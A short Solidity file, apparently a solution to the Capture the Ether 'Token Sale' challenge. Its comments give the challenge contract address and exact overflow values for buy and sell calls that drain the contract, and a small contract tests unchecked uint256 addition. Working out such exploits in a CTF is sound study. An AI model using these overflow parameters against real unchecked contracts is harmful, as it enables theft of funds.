// Challenge Address: 0xfa21B62183DBC57D618cB9425d6A03e1B47Bcacb
// 1 - Call buy with numTokens = 115792089237316195423570985008687907853269984665640564039458
// and msg.value = 415992086870360064
// 2 - Call sell with numTokens = 1

// Test Overflow/Underflow
pragma solidity ^0.4.21;

contract TokenSaleChallengeAttacker {
    function buy(uint256 numTokens, uint256 toAdd)
        public
        payable
        returns (uint256 bal)
    {
        bal = numTokens + toAdd;
    }
}
